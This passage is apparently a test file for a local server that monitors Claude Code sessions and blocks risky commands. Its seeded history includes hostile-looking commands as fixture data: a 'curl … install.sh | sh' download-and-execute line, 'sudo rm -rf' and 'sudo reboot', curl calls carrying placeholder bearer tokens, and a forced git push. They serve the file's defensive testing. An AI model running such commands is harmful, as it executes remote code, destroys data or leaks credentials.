// Tests du serveur (API v2 et v1 gardée) : node --test test/
// Le vrai server.mjs est lancé dans un processus à part, sur un faux ~ (dossier temporaire) : faux ~/.claude,
// faux ~/.claude.json, faux ~/Code, données de Vigie, dossiers de comptes et réglages VS Code temporaires,
// faux binaire « claude » (mcp seulement), faux open / osascript / pbcopy (ils notent ce qu'on leur demande),
// faux hooks en attente (processus « hook.mjs » qui dorment). Rien de réel n'est lu, écrit ni ouvert, et aucun
// secret n'est vrai.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { spawn, spawnSync } from 'node:child_process';
import fs from 'node:fs';
import http from 'node:http';
import net from 'node:net';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { DEFAULT_GUARDS } from '../lib/state.mjs';
import { HEALTH_STATUSES } from '../lib/mcp.mjs';
import { gitInstalled, MSG as LIB_MSG } from '../lib/libraries.mjs';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'vigie serveur-'));
const HOME = path.join(TMP, 'maison');
const CLAUDE = path.join(HOME, '.claude');
const PROJECTS = path.join(CLAUDE, 'projects');
const SESSIONS = path.join(CLAUDE, 'sessions');
const DATA = path.join(TMP, 'données vigie');
const CODE = path.join(HOME, 'Code');
const CWD = path.join(CODE, 'atelier');
const OTHER = path.join(CODE, 'autre');
const ACCOUNTS_ROOT = path.join(TMP, 'comptes');
const VSC = path.join(TMP, 'vscode', 'settings.json');
const FAKE = path.join(TMP, 'faux-claude.mjs');
const FAKE_LOG = path.join(TMP, 'faux-claude.log');   // appels « mcp login » du faux claude
const MAC_LOG = path.join(TMP, 'faux-mac.log');       // appels de open, osascript, pbcopy
const FAKE_HOOK = path.join(TMP, 'faux-hook', 'hook.mjs');
const APPS = path.join(TMP, 'Applications');             // faux /Applications (VIGIE_APPS_DIR)
const IDE = path.join(CLAUDE, 'ide');                     // fenêtres VS Code où Claude Code a démarré
const VSCODE_STARTS = path.join(TMP, 'vscode-demarre');   // présent : le faux open « démarre » la fenêtre VS Code
// Fenêtres VS Code : le moteur vérifie que le port du .lock répond (une fenêtre fermée laisse son fichier) : de vrais
// ports, ouverts ici. Les deux premiers pour les fenêtres posées par les essais, les autres pour le faux open.
const IDE_SERVERS = await Promise.all(Array.from({ length: 8 }, () => new Promise((resolve) => {
  const srv = net.createServer((c) => c.destroy()).listen(0, '127.0.0.1', () => resolve(srv));
  srv.unref();
})));
const IDE_PORTS = IDE_SERVERS.map((srv) => srv.address().port);
const IDE_PORTS_FILE = path.join(TMP, 'ports-vscode.json');
// Bibliothèques d'agents : de vrais dépôts git locaux (REPOS/<chemin>), servis au moteur par un faux git (VIGIE_GIT_BIN)
// qui note ses appels puis lance le vrai git en changeant https://github.com/ en file://REPOS/ ; https et ssh y sont
// coupés : aucun serveur réel n'est contacté. Sans git sur le Mac, l'essai est sauté.
const REAL_GIT = gitInstalled('/usr/bin/git') ? '/usr/bin/git' : null;
const REPOS = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'vigie-depots-')));
const FAKE_GIT = path.join(REPOS, 'faux-git.mjs');
const GIT_LOG = path.join(REPOS, 'faux-git.log');

const SID_A = 'b1b9b451-c53c-439e-b804-3689257268e3'; // ouverte (registre), garde-fou en attente
const SID_B = '9ca55731-9c56-4174-ad2a-c63bef5f7c11'; // fermée
const SID_APP = '6e2d8b9f-1a32-4e7c-8b4f-2c3d4e5f6a71'; // née dans l'app Claude (essai des agents)
const ORG = '11111111-2222-4333-8444-555555555555';
const ACC_UUID = '66666666-7777-4888-8999-000000000000';
// Faux secrets : aucun ne doit ressortir du serveur.
const SECRETS = ['demo_hdr_Q1w2E3r4T5y6U7i8O9p0', 'demo_tok_A1s2D3f4G5h6J7k8L9z0', 'demo_env_Z9x8C7v6B5n4M3q2W1e0', 'demo_cmd_P0o9I8u7Y6t5R4e3W2q1',
  'demo_sud_K8j7H6g5F4d3S2a1Q0w9', 'demo_lst_M1n2B3v4C5x6Z7l8K9j0'];

const NOW = Date.now();
const iso = (min) => new Date(NOW + min * 60_000).toISOString();
const w = (p, s, mode) => { fs.mkdirSync(path.dirname(p), { recursive: true }); fs.writeFileSync(p, s, mode ? { mode } : undefined); };
const wj = (p, o) => w(p, JSON.stringify(o, null, 2));
const rj = (p) => JSON.parse(fs.readFileSync(p, 'utf8'));
const deadPid = spawnSync('/usr/bin/true').pid;
// Heure locale à la façon de Claude Code (« resets 11:40pm »).
const clock = (ms) => { const d = new Date(ms); const h = d.getHours(); return `${h % 12 || 12}:${String(d.getMinutes()).padStart(2, '0')}${h >= 12 ? 'pm' : 'am'}`; };
// Faux hooks en attente : de vrais processus dont la ligne de commande contient « hook.mjs ».
w(FAKE_HOOK, 'setInterval(() => {}, 60_000); setTimeout(() => process.exit(0), 10 * 60_000); // jamais orphelin longtemps\n');
const hooks = [0, 1, 2].map(() => spawn(process.execPath, [FAKE_HOOK], { stdio: 'ignore' }));
const [HOOK_PUSH, HOOK_WHOAMI, HOOK_OLD] = hooks.map((c) => c.pid);
const macCalls = () => { try { return fs.readFileSync(MAC_LOG, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l)); } catch { return []; } };

// ---------- transcripts (même forme que les vrais, comme dans conversations.test.mjs) ----------
let n = 0;
const uid = () => `00000000-0000-4000-8000-${String(++n).padStart(12, '0')}`;
const U = (i = 100, o = 50) => ({ input_tokens: i, cache_creation_input_tokens: 0, cache_read_input_tokens: 0, output_tokens: o });
function mk(sid, cwd) {
  const meta = { cwd, sessionId: sid, version: '2.1.301', gitBranch: 'main' };
  const user = (content, ts, more = {}) => ({ parentUuid: null, isSidechain: false, promptId: uid(), type: 'user', message: { role: 'user', content }, uuid: uid(), timestamp: ts, ...more, userType: 'external', entrypoint: 'claude-vscode', ...meta });
  let msg = 0, tool = 0;
  const asst = (blocks, ts, { stop = 'tool_use', usage = U(), more = {} } = {}) =>
    ({ parentUuid: null, isSidechain: false, message: { model: 'claude-opus-5-5', id: `msg_${sid.slice(0, 4)}_${++msg}`, type: 'message', role: 'assistant', content: blocks, stop_reason: stop, stop_sequence: null, usage },
      requestId: 'req_1', type: 'assistant', uuid: uid(), timestamp: ts, userType: 'external', entrypoint: 'claude-vscode', ...meta, ...more });
  const call = (name, input, ts, content = 'ok') => {
    const id = `toolu_${sid.slice(0, 4)}${++tool}`;
    return [asst([{ type: 'tool_use', id, name, input }], ts), user([{ tool_use_id: id, type: 'tool_result', content, is_error: false }], ts, { toolUseResult: { stdout: content, stderr: '' } })];
  };
  const human = (text, ts) => user(text, ts, { origin: { kind: 'human' }, promptSource: 'sdk', turnOrigin: 'human' });
  const say = (text, ts, usage) => asst([{ type: 'text', text }], ts, { stop: 'end_turn', usage });
  const att = (attachment, ts) => ({ parentUuid: null, isSidechain: false, attachment, type: 'attachment', uuid: uid(), timestamp: ts, ...meta });
  return { asst, call, human, say, att };
}
const writeLines = (p, lines) => w(p, lines.flat().map((l) => JSON.stringify(l)).join('\n') + '\n');

function seed() {
  const A = mk(SID_A, CWD);
  const limit = (M, text, ts) => M.asst([{ type: 'text', text }], ts, { stop: 'stop_sequence', usage: U(0, 0), more: { isApiErrorMessage: true, error: 'rate_limit' } });
  writeLines(path.join(PROJECTS, '-maison-Code-atelier', `${SID_A}.jsonl`), [
    A.att({ type: 'credential_org', organizationUuid: ORG }, iso(-60)),
    A.human('refais la page d\'accueil', iso(-60)),
    A.call('TodoWrite', { todos: [{ content: 'Refaire l\'accueil', status: 'completed', activeForm: 'Refait l\'accueil' }, { content: 'Tester la page', status: 'in_progress', activeForm: 'Teste la page' }] }, iso(-59)),
    A.call('Bash', { command: 'npx tsc -b', description: 'Vérifier les types' }, iso(-56), 'src/accueil.tsx(3,1): error TS2322: Type \'string\' is not assignable to type \'number\'.\nFound 1 error.'),
    A.call('Bash', { command: 'npx vitest run', description: 'Lancer les tests' }, iso(-55), 'Tests 3 passed'),
    A.call('mcp__figma-perso__get_screenshot', { nodeId: '1:2' }, iso(-50)),
    A.call('mcp__claude_ai_Gmail__search_threads', { query: 'facture' }, iso(-45)),
    limit(A, `You've hit your session limit · resets ${clock(NOW + 120 * 60_000)}`, iso(-40)),
    A.say('La page d\'accueil est refaite et testée.', iso(-30), U(400, 200)),
  ]);
  const B = mk(SID_B, OTHER);
  writeLines(path.join(PROJECTS, '-maison-Code-autre', `${SID_B}.jsonl`), [
    B.att({ type: 'credential_org', organizationUuid: ORG }, iso(-120)),
    B.human('range les fichiers', iso(-120)),
    B.say('C\'est rangé.', iso(-115), U(100, 20)),
    // limite déjà remise à zéro : plus « à regarder »
    limit(B, `You've hit your session limit · resets ${clock(NOW - 10 * 60_000)}`, iso(-80)),
  ]);
  // Registre de Claude Code : A est ouverte (pid = ce processus de test, bien vivant).
  wj(path.join(SESSIONS, `${process.pid}.json`), { pid: process.pid, sessionId: SID_A, cwd: CWD, startedAt: NOW - 3600_000, status: 'busy', entrypoint: 'claude-vscode', name: 'atelier' });
  w(path.join(CLAUDE, '.credentials.json'), '{}', 0o600); // connecté sans interroger le trousseau
  wj(path.join(HOME, '.claude.json'), {
    oauthAccount: { accountUuid: ACC_UUID, emailAddress: 'alex@example.com', organizationUuid: ORG },
    cachedUsageUtilization: { fetchedAtMs: NOW - 60_000, accountUuid: ACC_UUID, utilization: { limits: [
      { kind: 'session', percent: 12, resets_at: iso(120) },
      { kind: 'weekly_all', percent: 40, resets_at: iso(3 * 24 * 60) },
    ] } },
    mcpServers: { 'figma-perso': { type: 'http', url: 'https://mcp.figma.com/mcp', headers: { Authorization: `Bearer ${SECRETS[0]}` } } },
    projects: { [CWD]: { mcpServers: { 'figma-desktop': { type: 'http', url: `http://127.0.0.1:3845/mcp?token=${SECRETS[1]}` } }, disabledMcpServers: [] } },
  });
  wj(path.join(CWD, '.mcp.json'), { mcpServers: { supabase: { type: 'stdio', command: 'npx', args: ['-y', '@supabase/mcp-server-supabase'], env: { SUPABASE_ACCESS_TOKEN: SECRETS[2] } } } });
  fs.mkdirSync(OTHER, { recursive: true });
  w(VSC, '{\n  // réglages de test\n  "editor.fontSize": 13,\n}\n');
  wj(path.join(DATA, 'state.json'), { version: 1, autoAccept: true, questions: 'ask', questionWaitMin: 20, guard: { enabled: true, waitMin: 10 }, sessions: {} });
  wj(path.join(DATA, 'ui.json'), { lastSeen: iso(-90) });
  const h = (min, event, extra) => ({ ts: iso(min), event, sessionId: SID_A, cwd: CWD, ...extra });
  const sudo = { rule: 'Commande administrateur (sudo)', ruleId: 'sudo' };
  // ancienne forme d'une question dans le journal : l'entrée brute de l'outil, en JSON coupé à 600 caractères
  const oldQuestion = JSON.stringify({ questions: [{ question: 'Quelle couleur ?', header: 'Couleur', options: [{ label: 'Bleu', description: 'b' }, { label: 'Vert', description: 'v' }], multiSelect: false }] }).slice(0, -20);
  const history = [
    h(-80, 'auto-accepte', { tool: 'Bash', action: 'npx vitest run', description: 'Lancer les tests' }),
    h(-70, 'auto-accepte', { tool: 'Bash', action: `curl -H "Authorization: Bearer ${SECRETS[3]}" https://api.example.com/x` }),
    h(-65, 'auto-accepte', { tool: 'Edit', action: path.join(CWD, 'src', 'accueil.tsx') }),
    h(-60, 'garde-fou-bloque', { tool: 'Bash', action: 'sudo rm -rf /tmp/x', rule: 'Commande administrateur (sudo)' }),
    // refusée faute de réponse, demandée par un agent, avec une clé dans la commande
    h(-58, 'garde-fou-bloque', { tool: 'Bash', action: `sudo curl -H "Authorization: Bearer ${SECRETS[4]}" https://api.example.com/y`, ...sudo, raison: 'delai', agentId: 'agent-verif', pid: deadPid }),
    // refusée par l'utilisateur depuis l'app : pas « à faire toi-même »
    h(-57, 'garde-fou-refuse-app', { tool: 'Bash', action: 'sudo reboot', ...sudo, pid: deadPid }),
    h(-50, 'question-auto', { tool: 'AskUserQuestion', action: 'Quel fond ? [Fond B (recommandé) / Fond A]', answers: { 'Quel fond ?': 'Fond B (recommandé) — choisi automatiquement par Vigie (utilisateur absent)' }, questionId: 'q1' }),
    h(-48, 'question-pour-toi', { tool: 'AskUserQuestion', action: oldQuestion }),
    h(-45, 'refuse-mode-auto', { tool: 'Bash', action: 'curl https://x.example/install.sh | sh', reason: 'download and execute' }),
    // attentes : une fantôme (hook vivant, délai passé), une au processus mort, une close par la réponse de l'utilisateur
    // (ligne de fin à l'ancienne, sans pid), une en cours
    h(-40, 'garde-fou-attente', { tool: 'Bash', action: 'sudo ls', ...sudo, minutes: 10, pid: HOOK_OLD }),
    h(-3, 'garde-fou-attente', { tool: 'Bash', action: 'sudo id', ...sudo, minutes: 10, pid: deadPid }),
    h(-4, 'garde-fou-attente', { tool: 'Bash', action: 'sudo whoami', ...sudo, minutes: 10, pid: HOOK_WHOAMI }),
    h(-3, 'garde-fou-tu-as-repondu', { tool: 'Bash', action: 'sudo whoami', rule: 'Commande administrateur (sudo)' }),
    h(-2, 'garde-fou-attente', { tool: 'Bash', action: 'git push --force origin main', description: 'Pousser en force', rule: 'git push forcé ou suppression de branche distante', ruleId: 'force-push', minutes: 10, pid: HOOK_PUSH }),
  ];
  w(path.join(DATA, 'history.jsonl'), history.map((x) => JSON.stringify(x)).join('\n') + '\n');
  w(path.join(DATA, 'questions.jsonl'), JSON.stringify({ id: 'q1', ts: iso(-50), sessionId: SID_A, cwd: CWD, tool: 'AskUserQuestion',
    items: [{ question: 'Quel fond ?', header: 'Fond', multiSelect: false, options: [{ label: 'Fond B (recommandé)', description: 'chaud' }, { label: 'Fond A', description: 'froid' }], chosen: 'Fond B (recommandé)' }] }) + '\n');
  // Faux « claude » : sous-commandes mcp seulement (jamais -p : code 2). add-json / remove écrivent mcpServers
  // comme la vraie CLI (HOME ou CLAUDE_CONFIG_DIR) ; list imprime des états (avec un secret dans une cible,
  // qui ne doit jamais ressortir) ; login --help et login <nom> (noté dans FAKE_LOG, rien d'autre).
  w(FAKE, `#!${process.execPath}
import fs from 'node:fs'; import path from 'node:path';
const [top, sub, name, json] = process.argv.slice(2);
if (top !== 'mcp') process.exit(2);
if (sub === 'list') {
  console.log('Checking MCP server health…\\n');
  console.log('claude.ai Gmail: https://gmail.mcp.claude.com/mcp - ! Needs authentication');
  console.log('figma-perso: https://mcp.figma.com/mcp (HTTP) - ✔ Connected');
  console.log('figma-desktop: http://127.0.0.1:3845/mcp?token=${SECRETS[5]} (HTTP) - ✘ Failed to connect');
  console.log('supabase: npx -y @supabase/mcp-server-supabase - ✔ Connected');
  process.exit(0);
}
if (sub === 'login') {
  if (name === '--help') { console.log('Usage: claude mcp login [options] <name>\\n\\nAuthenticate with an MCP server'); process.exit(0); }
  fs.appendFileSync(${JSON.stringify(FAKE_LOG)}, JSON.stringify({ name, cwd: process.cwd(), configDir: process.env.CLAUDE_CONFIG_DIR || null }) + '\\n');
  console.log('Opening browser…'); process.exit(0);
}
const file = process.env.CLAUDE_CONFIG_DIR ? path.join(process.env.CLAUDE_CONFIG_DIR, '.claude.json') : path.join(process.env.HOME, '.claude.json');
let j = {}; try { j = JSON.parse(fs.readFileSync(file, 'utf8')); } catch {}
j.mcpServers ||= {};
if (sub === 'add-json') { if (j.mcpServers[name]) { console.error('MCP server ' + name + ' already exists'); process.exit(1); } j.mcpServers[name] = JSON.parse(json); }
else if (sub === 'remove') { if (!j.mcpServers[name]) { console.error('No MCP server named ' + name); process.exit(1); } delete j.mcpServers[name]; }
else process.exit(2);
fs.writeFileSync(file, JSON.stringify(j, null, 2));
`, 0o755);
  // Faux open, osascript, pbcopy : notent leurs arguments (et ce qu'on leur donne à lire) dans MAC_LOG. Le faux open
  // « démarre » une fenêtre VS Code si VSCODE_STARTS existe : il écrit son ~/.claude/ide/<port>.lock comme l'extension
  // Claude Code (pid : le moteur qui l'a lancé, bien vivant).
  for (const name of ['open', 'osascript', 'pbcopy']) {
    w(path.join(TMP, 'faux-mac', name), `#!${process.execPath}
import fs from 'node:fs';
let input = '';
const args = process.argv.slice(2);
if (${JSON.stringify(name)} === 'pbcopy') { try { input = fs.readFileSync(0, 'utf8'); } catch {} }
fs.appendFileSync(${JSON.stringify(MAC_LOG)}, JSON.stringify({ bin: ${JSON.stringify(name)}, args, input }) + '\\n');
if (${JSON.stringify(name)} === 'open' && args[0] === '-a' && args[1] === 'Visual Studio Code' && fs.existsSync(${JSON.stringify(VSCODE_STARTS)})) {
  fs.mkdirSync(${JSON.stringify(IDE)}, { recursive: true });
  const ports = JSON.parse(fs.readFileSync(${JSON.stringify(IDE_PORTS_FILE)}, 'utf8'));
  const port = ports.find((p) => !fs.existsSync(${JSON.stringify(IDE)} + '/' + p + '.lock'));
  fs.writeFileSync(${JSON.stringify(IDE)} + '/' + port + '.lock',
    JSON.stringify({ pid: process.ppid, workspaceFolders: [args[2]], ideName: 'Visual Studio Code', transport: 'ws' }));
}
`, 0o755);
  }
  fs.writeFileSync(IDE_PORTS_FILE, JSON.stringify(IDE_PORTS.slice(2)));
  w(FAKE_GIT, `#!${process.execPath}
import fs from 'node:fs';
import { spawnSync } from 'node:child_process';
const args = process.argv.slice(2);
fs.appendFileSync(${JSON.stringify(GIT_LOG)}, JSON.stringify({ args }) + '\\n');
const swap = { 'protocol.file.allow=never': 'protocol.file.allow=always', 'protocol.https.allow=always': 'protocol.https.allow=never', 'protocol.ssh.allow=always': 'protocol.ssh.allow=never' };
const r = spawnSync(${JSON.stringify(REAL_GIT || '/nonexistent')}, ['-c', ${JSON.stringify(`url.file://${REPOS}/.insteadOf=https://github.com/`)}, ...args.map((a) => swap[a] ?? a)],
  { stdio: 'inherit', env: { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1' } });
process.exit(r.status ?? 1);
`, 0o755);
  // VS Code et son extension Claude Code, l'app Claude : installés (faux /Applications) ; la fenêtre VS Code de la
  // conversation ouverte (SID_A) existe déjà.
  fs.mkdirSync(path.join(APPS, 'Visual Studio Code.app'), { recursive: true });
  fs.mkdirSync(path.join(APPS, 'Claude.app'), { recursive: true });
  fs.mkdirSync(path.join(HOME, '.vscode', 'extensions', 'anthropic.claude-code-2.1.304-darwin-arm64'), { recursive: true });
  wj(path.join(IDE, `${IDE_PORTS[0]}.lock`), { pid: process.pid, workspaceFolders: [CWD], ideName: 'Visual Studio Code', transport: 'ws' });
  // une conversation née dans l'app Claude (essai des agents) : son titre et son id local
  wj(path.join(HOME, 'Library', 'Application Support', 'Claude', 'claude-code-sessions', 'compte', 'espace', 'local_9c1f.json'),
    { cliSessionId: SID_APP, title: 'Charte du cabinet', isArchived: false });
}

// ---------- serveur ----------
let child, PORT, logs = '';
before(async () => {
  seed();
  const mac = (name) => path.join(TMP, 'faux-mac', name);
  const env = {
    PATH: process.env.PATH, TMPDIR: os.tmpdir(), HOME, VIGIE_HOME: HOME, VIGIE_CLAUDE_DIR: CLAUDE, VIGIE_DATA: DATA, VIGIE_PORT: '0', VIGIE_NO_UPDATE: '1', VIGIE_NO_MCP_SYNC: '1', VIGIE_NO_WRAPPER_AUTO: '1',
    VIGIE_ACCOUNTS_ROOT: ACCOUNTS_ROOT, VIGIE_VSCODE_SETTINGS: VSC, VIGIE_RUNCAT_STATE: path.join(TMP, 'runcat.json'),
    VIGIE_QUOTA_FILE: path.join(TMP, 'quota.json'), VIGIE_CLAUDE_BIN: FAKE,
    VIGIE_MCP_CHECK: '0', // pas de relevé automatique : le test le demande lui-même
    VIGIE_OPEN_BIN: mac('open'), VIGIE_OSASCRIPT: mac('osascript'), VIGIE_PBCOPY: mac('pbcopy'), VIGIE_SHELL: '/bin/zsh',
    VIGIE_APPS_DIR: APPS, VIGIE_IDE_WAIT_MS: '1500', // fenêtre VS Code attendue 1,5 s au plus (25 s pour de vrai)
    VIGIE_GIT_BIN: FAKE_GIT, // faux git : dépôts locaux derrière des adresses GitHub
    VIGIE_RESOLVE: JSON.stringify({ 'github.com': ['140.82.112.3'] }), // hôtes https résolus sans DNS
  };
  child = spawn(process.execPath, [path.join(ROOT, 'server.mjs')], { env, stdio: ['ignore', 'pipe', 'pipe'] });
  child.stderr.on('data', (d) => { logs += d; });
  PORT = await new Promise((resolve, reject) => {
    const t = setTimeout(() => reject(new Error(`serveur muet : ${logs}`)), 10_000);
    child.stdout.on('data', (d) => { logs += d; const m = /127\.0\.0\.1:(\d+)/.exec(logs); if (m) { clearTimeout(t); resolve(Number(m[1])); } });
    child.on('exit', (c) => reject(new Error(`serveur arrêté (${c}) : ${logs}`)));
  });
  for (let i = 0; i < 100; i++) {
    const r = await get('/api/v2/health');
    if (r.body?.indexing?.done && (await get('/api/v2/overview')).body.conversations.length === 2) return;
    await new Promise((r2) => setTimeout(r2, 100));
  }
  throw new Error('indexation trop longue');
});
after(() => {
  child?.kill('SIGTERM');
  for (const hk of hooks) hk.kill('SIGKILL');
  fs.rmSync(TMP, { recursive: true, force: true });
  fs.rmSync(REPOS, { recursive: true, force: true });
});

// Jeton d'accès posé par le moteur au démarrage ; `token: null` pour un appel sans lui.
const token = () => fs.readFileSync(path.join(DATA, 'api-token'), 'utf8').trim();
function raw(method, p, { body, headers = {}, token: tok = token() } = {}) {
  return new Promise((resolve, reject) => {
    const req = http.request({ host: '127.0.0.1', port: PORT, method, path: p, headers: tok ? { 'X-Vigie-Token': tok, ...headers } : headers }, (res) => {
      let d = '';
      res.on('data', (c) => { d += c; });
      res.on('end', () => { let j = null; try { j = JSON.parse(d); } catch { /* texte */ } resolve({ status: res.statusCode, headers: res.headers, text: d, body: j }); });
    });
    req.on('error', reject);
    if (body !== undefined) req.write(typeof body === 'string' ? body : JSON.stringify(body));
    req.end();
  });
}
const get = (p) => raw('GET', p);
const post = (p, body, headers = { 'Content-Type': 'application/json', 'X-Vigie': '1' }) => raw('POST', p, { body, headers });
const noSecret = (r) => { for (const s of SECRETS) assert.ok(!r.text.includes(s), 'un secret est sorti du serveur'); };

// ---------- contrat (docs/api-v2.md) ----------
const opt = (s) => ({ $opt: s });
const oneOf = (...v) => ({ $enum: v });
const arr = (s) => ({ $arr: s });
const isObj = (v) => !!v && typeof v === 'object' && !Array.isArray(v);
function check(v, s, at = '$', errs = []) {
  if (isObj(s) && '$opt' in s) { if (v === null || v === undefined) return errs; return check(v, s.$opt, at, errs); }
  if (v === undefined || v === null) { errs.push(`${at} : absent`); return errs; }
  if (s === 'string') { if (typeof v !== 'string') errs.push(`${at} : texte attendu`); return errs; }
  if (s === 'int') { if (!Number.isInteger(v)) errs.push(`${at} : entier attendu`); return errs; } // l'app décode des Int
  if (s === 'number') { if (typeof v !== 'number' || !Number.isFinite(v)) errs.push(`${at} : nombre attendu`); return errs; }
  if (s === 'bool') { if (typeof v !== 'boolean') errs.push(`${at} : booléen attendu`); return errs; }
  if (s === 'service') { if (typeof v !== 'string' || !/^[a-z0-9-]+$/.test(v) || v === 'other') errs.push(`${at} : service inattendu ${JSON.stringify(v)}`); return errs; }
  if (s === 'iso') { if (typeof v !== 'string' || !/^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d(\.\d+)?Z$/.test(v)) errs.push(`${at} : date ISO UTC attendue`); return errs; }
  if (s.$enum) { if (!s.$enum.includes(v)) errs.push(`${at} : valeur inattendue ${JSON.stringify(v)}`); return errs; }
  if (s.$arr) { if (!Array.isArray(v)) errs.push(`${at} : liste attendue`); else v.forEach((x, i) => check(x, s.$arr, `${at}[${i}]`, errs)); return errs; }
  if (!isObj(v)) { errs.push(`${at} : objet attendu`); return errs; }
  for (const [k, sub] of Object.entries(s)) check(v[k], sub, `${at}.${k}`, errs);
  return errs;
}
const ISO = 'iso';
const Window = { pct: 'number', resetsAt: opt(ISO) };
const AccountSummary = {
  id: 'string', label: 'string', email: opt('string'), connected: 'bool', isDefault: 'bool',
  usage: { session: opt(Window), week: opt(Window), weekModel: opt({ label: 'string', pct: 'number', resetsAt: opt(ISO) }), observedAt: opt(ISO) },
};
const DECISION = oneOf('auto', 'you', 'blocked', 'waiting', 'denied');
const ITEM_KIND = oneOf('command', 'commit', 'push', 'file', 'web', 'mcp', 'agent', 'question', 'other');
// Identifiant de service (icône) : minuscules, jamais l'ancien « other » (remplacé par « autre »).
const SERVICE = 'service';
const ConversationSummary = {
  id: 'string', title: 'string', project: 'string', cwd: opt('string'),
  status: oneOf('working', 'idle', 'waiting', 'blocked', 'closed'), running: 'bool', accountId: opt('string'),
  autoAccept: 'bool', autoAcceptOverride: opt('bool'), connectors: oneOf('on', 'off'),
  agentsRunning: 'int', workflowsRunning: 'int', weekPct: opt('number'), lastActivity: opt(ISO), needsYou: 'int', headline: opt('string'),
  // carte de la vue d'ensemble (tour 2)
  progress: opt({ done: 'int', total: 'int', label: 'string', current: opt('string') }),
  // consommation en direct et alerte (tour 3)
  rate: opt({ weekPctPerHour: opt('number'), tokensPerMin: 'int', spark: arr('number'), trend: oneOf('up', 'flat', 'down') }),
  alert: opt({ kind: oneOf('emballe'), since: ISO, reason: 'string' }),
  tests: { failedRecent: 'int', running: 'int', lastOk: opt('bool'), lastTs: opt(ISO), lastTitle: opt('string'),
    failures: opt(arr({ title: 'string', line: opt('string'), kind: oneOf('tests', 'e2e', 'types', 'lint', 'build'), ts: ISO, by: opt('string') })) },
  accepted: { today: 'int', sinceSeen: 'int' },
  artifacts: { count: 'int', last: opt({ title: 'string', url: opt('string'), ts: opt(ISO) }) },
};
const Overview = {
  now: ISO,
  settings: { autoAccept: 'bool', questionsAuto: 'bool', questionWaitMin: 'int', connectorsDefault: oneOf('on', 'off'),
    guard: { enabled: 'bool', waitMin: 'int', rules: arr({ id: 'string', label: 'string', disabled: 'bool' }) } },
  since: ISO,
  sinceSummary: { accepted: 'int', questionsAuto: 'int', blocked: 'int', reports: 'int', testsFailed: 'int', limits: 'int' },
  toReview: arr({
    id: 'string', kind: oneOf('question', 'blocked', 'waiting', 'limit'), conversationId: opt('string'), conversationTitle: opt('string'),
    title: 'string', detail: opt('string'), ts: ISO,
    question: opt({ id: 'string', items: arr({ question: 'string', header: opt('string'), multiSelect: 'bool', options: arr({ label: 'string', description: opt('string') }), chosen: opt('string') }) }),
    // garde-fou (kind = blocked)
    state: opt(oneOf('waiting', 'blocked', 'awaiting')), approvalId: opt('string'), approved: opt('bool'), pendingId: opt('string'), expiresAt: opt(ISO), rule: opt('string'), command: opt('string'),
    byAgent: opt('string'), cwd: opt('string'), needsPassword: opt('bool'),
  }),
  reports: arr({ kind: oneOf('artifact', 'missionDone', 'workflowDone'), conversationId: 'string', conversationTitle: 'string', title: 'string', detail: opt('string'), url: opt('string'), ts: ISO }),
  accounts: arr(AccountSummary), conversations: arr(ConversationSummary),
  recentAccepted: arr({ ts: ISO, conversationId: opt('string'), conversationTitle: opt('string'), project: opt('string'), kind: ITEM_KIND,
    title: 'string', detail: opt('string'), decision: DECISION, agent: opt('string'), service: opt(SERVICE) }),
  engine: { indexing: 'bool', wrapperActive: 'bool' },
};
const Agent = {
  id: 'string', title: 'string', type: opt('string'), workflow: opt('string'), phase: opt('string'), startedAt: opt(ISO), lastAt: opt(ISO),
  durationMs: opt('number'), actions: opt('int'), files: opt('int'), tests: opt('int'), status: oneOf('running', 'done', 'failed', 'killed', 'idle'), lastAction: opt('string'),
};
const Tokens = { input: 'int', output: 'int', cacheRead: 'int', cacheWrite: 'int' };
const Detail = {
  summary: { ...ConversationSummary, branch: opt('string'), startedAt: opt(ISO) },
  now: { text: opt('string'), ts: opt(ISO), tasks: arr({ text: 'string', status: oneOf('done', 'doing', 'todo') }), tasksTs: opt(ISO),
    plan: opt({ title: 'string', file: 'string', updatedAt: opt(ISO), steps: arr({ id: opt('string'), text: 'string', status: oneOf('done', 'doing', 'todo'), group: opt('string') }),
      done: 'int', total: 'int', current: opt('string') }) },
  chapters: arr({ id: 'string', prompt: 'string', start: ISO, end: ISO, durationMs: 'number',
    stats: { workflows: 'int', agents: 'int', artifacts: 'int', files: 'int', tests: 'int', testsFailed: 'int', commits: 'int' }, outcome: opt('string') }),
  accepted: arr({ ts: ISO, kind: ITEM_KIND, title: 'string', detail: opt('string'), decision: DECISION }),
  activity: arr({ ts: ISO, kind: 'string', title: 'string', detail: opt('string'), agent: opt('string'), ok: opt('bool') }),
  agents: { running: arr(Agent), done: arr(Agent) },
  workflows: arr({ id: 'string', name: 'string', summary: opt('string'), status: oneOf('running', 'done', 'failed', 'killed', 'idle'), startedAt: opt(ISO),
    durationMs: opt('number'), agents: opt('int'), tokens: opt('int'), phases: opt(arr('string')) }),
  artifacts: arr({ title: 'string', url: opt('string'), description: opt('string'), ts: opt(ISO), publishes: opt('int') }),
  files: arr({ path: 'string', name: 'string', ext: opt('string'), kind: oneOf('code', 'style', 'page', 'doc', 'data', 'image', 'media', 'config', 'other'),
    created: 'bool', writes: 'int', ts: opt(ISO), by: opt('string'), location: oneOf('project', 'elsewhere', 'scratch') }),
  tests: arr({ ts: ISO, kind: oneOf('tests', 'e2e', 'types', 'lint', 'build'), ok: opt('bool'), passed: opt('int'), failed: opt('int'), title: 'string', command: opt('string'), by: opt('string') }),
  mcp: arr({ name: 'string', scope: oneOf('project', 'user', 'local', 'connector', 'plugin', 'unknown'), uses: 'int', enabled: opt('bool'),
    service: SERVICE, status: oneOf(...HEALTH_STATUSES) }),
  tokens: { today: Tokens, total: Tokens },
  limits: arr({ ts: ISO, text: 'string' }),
};
const Health = arr({ accountId: 'string', status: oneOf(...HEALTH_STATUSES), checkedAt: opt(ISO) });
const Server = { name: 'string', type: oneOf('stdio', 'http', 'sse', 'ws', 'sdk'), target: 'string', service: SERVICE, uses7d: 'int', health: Health };
const Mcp = {
  user: arr({ ...Server, accounts: arr('string'), needsAuth: 'bool', needsAuthIn: arr('string') }),
